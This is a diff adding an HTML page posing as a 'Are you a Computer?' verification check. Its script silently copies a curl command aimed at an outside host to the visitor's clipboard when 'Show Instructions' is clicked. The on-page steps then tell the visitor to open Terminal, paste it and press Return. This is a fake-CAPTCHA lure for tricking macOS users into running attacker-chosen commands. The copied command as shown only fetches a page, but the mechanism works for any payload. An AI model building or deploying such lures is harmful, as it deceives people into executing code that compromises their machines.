@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Are you a Computer?</title>
+  <style>
+    :root{
+      --bg: #0f0f0f;
+      --card: #1f1f1f;
+      --text: #f6f6f6;
+      --muted: #d3d3d3;
+      --btn: #57b38f;
+      --btn-hover: #67c6a1;
+      --shadow: 0 22px 60px rgba(0,0,0,.55);
+      --radius: 18px;
+      --kbd-bg: #eaeaea;
+      --kbd-fg: #111;
+      --kbd-br: #cfcfcf;
+    }
+
+    * { box-sizing: border-box; }
+
+    body{
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      background: var(--bg);
+      color: var(--text);
+      font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    .card{
+      width: min(720px, 92vw);
+      background: var(--card);
+      border-radius: var(--radius);
+      padding: clamp(26px, 5.2vw, 44px);
+      text-align: center;
+      box-shadow: var(--shadow);
+    }
+
+    h1{
+      margin: 6px 0 12px;
+      font-size: clamp(30px, 5.8vw, 54px);
+      font-weight: 800;
+      letter-spacing: .2px;
+    }
+
+    .sub{
+      margin: 0 0 24px;
+      color: var(--muted);
+      font-size: clamp(16px, 2.4vw, 20px);
+    }
+
+    .btn{
+      appearance: none;
+      border: 0;
+      background: var(--btn);
+      color: #fff;
+      font-size: clamp(16px, 2.2vw, 20px);
+      padding: 14px 26px;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: transform .06s ease, background .15s ease;
+      box-shadow: 0 6px 16px rgba(0,0,0,.35);
+    }
+    .btn:hover{ background: var(--btn-hover); }
+    .btn:active{ transform: translateY(1px) scale(.99); }
+    .btn:focus-visible{ outline: 3px solid #9ce3cb; outline-offset: 3px; }
+
+    .instructions{
+      display: none;
+      margin-top: 24px;
+      text-align: center;
+      line-height: 1.45;
+    }
+    .instructions.show{ display: block; }
+
+    .mini-btn{
+      display: inline-block;
+      background: var(--btn);
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 10px;
+      font-weight: 600;
+      margin-bottom: 18px;
+      box-shadow: 0 4px 12px rgba(0,0,0,.35);
+      font-size: clamp(14px, 2vw, 18px);
+    }
+
+    .step{
+      font-size: clamp(18px, 2.4vw, 22px);
+      margin: 18px 0;
+      font-weight: 700;
+    }
+    .step span{ font-weight: 500; }
+
+    /* Terminal icon recreated with CSS (no image) */
+    .term-wrap{
+      display: grid;
+      place-items: center;
+      margin: 10px 0 6px;
+    }
+    .term{
+      width: 54px; height: 42px;
+      border-radius: 6px;
+      background: linear-gradient(#2a2a2a, #121212);
+      box-shadow: inset 0 0 0 2px rgba(255,255,255,.08),
+                  inset 0 0 0 1px rgba(0,0,0,.5),
+                  0 6px 18px rgba(0,0,0,.45);
+      position: relative;
+    }
+    .term::before{
+      content: ">";
+      position: absolute;
+      left: 10px; top: 8px;
+      color: #e9e9e9;
+      font-weight: 800;
+      font-size: 18px;
+    }
+    .term::after{
+      content: "_";
+      position: absolute;
+      left: 26px; top: 8px;
+      color: #e9e9e9;
+      font-weight: 800;
+      font-size: 18px;
+    }
+
+    /* Keyboard tokens */
+    kbd{
+      background: var(--kbd-bg);
+      color: var(--kbd-fg);
+      border: 1px solid var(--kbd-br);
+      border-bottom-width: 3px;
+      border-radius: 6px;
+      padding: 2px 6px;
+      font-weight: 700;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
+      font-size: .95em;
+      display: inline-block;
+      margin: 0 2px;
+    }
+
+    .ok{
+      margin-top: 14px;
+      display: inline-block;
+    }
+  </style>
+</head>
+<body>
+  <main class="card" role="dialog" aria-labelledby="title" aria-describedby="subtitle">
+    <h1 id="title">Are you a Computer?</h1>
+    <p id="subtitle" class="sub">Please see instructions to confirm:</p>
+
+    <!-- Toggles the panel and copies the command -->
+    <button id="toggle" class="btn" aria-expanded="false" aria-controls="inst">
+      Show Instructions
+    </button>
+
+    <!-- Recreated “Show Instructions” layout (no image) -->
+    <section id="inst" class="instructions" role="region" aria-live="polite">
+      <div class="mini-btn" aria-hidden="true">Instructions</div>
+
+      <p class="step">Step 1: <span>Locate and Click the Terminal Icon</span></p>
+      <div class="term-wrap">
+        <div class="term" aria-label="Terminal icon"></div>
+      </div>
+
+      <p class="step">
+        Step 2:
+        <span>Press <kbd>COMMAND</kbd>+<kbd>V</kbd> and hit <kbd>RETURN</kbd></span>
+      </p>
+
+      <p class="step">Step 3: <span>Click the "OK" button</span></p>
+
+      <button class="btn ok" type="button">OK</button>
+    </section>
+  </main>
+
+  <script>
+    const btn = document.getElementById('toggle');
+    const panel = document.getElementById('inst');
+
+    btn.addEventListener('click', () => {
+      // Toggle panel visibility
+      const open = panel.classList.toggle('show');
+      btn.setAttribute('aria-expanded', String(open));
+      btn.textContent = open ? 'Hide Instructions' : 'Show Instructions';
+
+      // Copy command to clipboard (unchanged)
+      const textToCopy = "curl -s https://velocity.show/scout1.html";
+      navigator.clipboard.writeText(textToCopy).catch(() => {});
+    });
+  </script>
+</body>
+</html>
